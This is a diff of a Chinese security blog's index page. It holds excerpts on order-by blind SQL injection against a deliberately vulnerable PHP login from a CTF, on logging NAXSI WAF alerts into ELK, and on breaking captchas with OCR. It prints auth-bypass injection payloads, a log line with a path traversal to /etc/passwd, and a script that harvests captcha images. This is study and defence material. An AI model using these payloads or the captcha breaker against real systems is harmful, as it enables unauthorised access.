+<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
+<p><img src="/2017/11/23/order-by-blind/2.png"></p>
+<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
+select * from admin where username&#x3D;&#39;&#39;&#x2F;2
+select * from admin where username&#x3D;&#39;&#39;^1^1
+select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后是基于order by的盲注：</p>
+<p>首先是基本知识:</p>
+	
+
+	</div>
+  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+  $dbhost &#x3D; &quot;172.19.0.2&quot;;
+  $dbuser &#x3D; &quot;root&quot;;
+  $dbpass &#x3D; &quot;root&quot;;
+  $db &#x3D; &quot;vul&quot;;
+  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,&quot;utf8&quot;);
+ 
+  &#x2F;* sql
+ 
+     create  table &#96;admin&#96; (
+        &#96;id&#96; int(10) not null primary key auto_increment,
+        &#96;username&#96; varchar(20) not null ,
+        &#96;password&#96; varchar(32) not null
+     );
+  *&#x2F;
+function   filter($str)&#123;
+      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
+      if(preg_match($filterlist,strtolower($str)))&#123;
+        die(&quot;illegal input!&quot;);
+      &#125;
+      return $str;
+  &#125;
+$username &#x3D; isset($_POST[&#39;username&#39;])?
+filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
+$password &#x3D; isset($_POST[&#39;password&#39;])?
+filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
+$sql &#x3D; &quot;select * from admin where  username &#x3D;
+ &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
+ 
+$res &#x3D; $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0)&#123;
+  $row &#x3D; $res -&gt; fetch_assoc();
+  if($row[&#39;id&#39;])&#123;
+     echo $row[&#39;username&#39;];
+  &#125;
+&#125;else&#123;
+   echo &quot;The content in the password column is the &quot;;
+&#125;
+ 
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
+<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
+<p><img src="/2017/11/23/order-by-blind/2.png"></p>
+<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
+select * from admin where username&#x3D;&#39;&#39;&#x2F;2
+select * from admin where username&#x3D;&#39;&#39;^1^1
+select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后是基于order by的盲注：</p>
+<p>首先是基本知识:</p>
+	
+	</div>
+  <a type="button" href="/2017/11/23/order-by-blind.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/11/02/naxsi.html" >naxsi的规则</a>
 		</h3>
 		</div>
@@ -469,832 +923,6 @@ def tamper(payload, **kwargs):
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/10/25/naxsi-elk.html" >NAXSI和ELK</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-10-25  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
-<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
-<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
-2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
-<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
-logstash&gt; cd pattern
-logstash&gt; vim naxsi
-DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
-TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
-LEVEL (\w+)
-NUM1 \d+(?:#0: \*)
-NUM2 \d+
-EXLOG NAXSI_EXLOG
-FMT NAXSI_FMT
-ID1 (\d+)
-ZONE \w+
-VAR1  (.*)
-CONTENT (.*)
-T3 \w+
-T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
-HOST (.*)
-NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
-NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
-<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
-bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">input&#123;
-     file &#123;
-       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
-       type &#x3D;&gt; &quot;naxsi-error&quot;
-       start_position &#x3D;&gt; &quot;beginning&quot;
-   			&#125;
-&#125;
-filter&#123;
-     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	grok &#123;
-		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
-		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
-			]
-  	     &#125;
-	ruby &#123;
-	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
-	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
-	    &#125;
-
-&#125;
-&#125;
-output&#123;
-      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	elasticsearch &#123;
-	   hosts &#x3D;&gt; [&quot;localhost&quot;]
-	   index &#x3D;&gt; &quot;nxapi&quot;
-           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
-	&#125;
-	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
-     &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
-<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
-<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
-2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
-<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
-logstash&gt; cd pattern
-logstash&gt; vim naxsi
-DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
-TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
-LEVEL (\w+)
-NUM1 \d+(?:#0: \*)
-NUM2 \d+
-EXLOG NAXSI_EXLOG
-FMT NAXSI_FMT
-ID1 (\d+)
-ZONE \w+
-VAR1  (.*)
-CONTENT (.*)
-T3 \w+
-T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
-HOST (.*)
-NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
-NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
-<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
-bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">input&#123;
-     file &#123;
-       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
-       type &#x3D;&gt; &quot;naxsi-error&quot;
-       start_position &#x3D;&gt; &quot;beginning&quot;
-   			&#125;
-&#125;
-filter&#123;
-     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	grok &#123;
-		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
-		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
-			]
-  	     &#125;
-	ruby &#123;
-	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
-	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
-	    &#125;
-
-&#125;
-&#125;
-output&#123;
-      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	elasticsearch &#123;
-	   hosts &#x3D;&gt; [&quot;localhost&quot;]
-	   index &#x3D;&gt; &quot;nxapi&quot;
-           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
-	&#125;
-	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
-     &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/09/26/VerifyCode.html" >验证码识别</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-09-26  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>先灰度处理</p>
-<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
-img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
-img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>然后是二值化, 二值化处理之后，投影</p>
-<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;
-
-for i in range(20):
-	imgfile &#x3D; str(i) + &#39;.jpg&#39;
-	req &#x3D; requests.get(url)
-	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
-	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
-	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
-<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
-<p>我们这里使用8邻域算法。</p>
-<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
-from PIL import Image
-import os
-import re
-import pytesseract
-
-def binarizing(img, threshold):
-   img &#x3D; img.convert(&quot;L&quot;)
-   pixdata &#x3D; img.load()
-   w, h &#x3D; img.size
-   for y in range(h):
-      for x in range(w):
-         if pixdata[x, y] &lt; threshold:
-            pixdata[x, y] &#x3D; 0
-         else:
-            pixdata[x, y] &#x3D; 255
-   return img
-   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)
-
-
-def depoint(img):
-   pixdata &#x3D; img.load()
-   w,h &#x3D; img.size
-   for y in range(1,h-1):
-      for x in range(1, w-1):
-         count &#x3D; 0
-         if pixdata[x, y-1] &gt; 245:
-            count &#x3D; count + 1
-         if pixdata[x, y+1] &gt; 245:
-            count &#x3D; count + 1
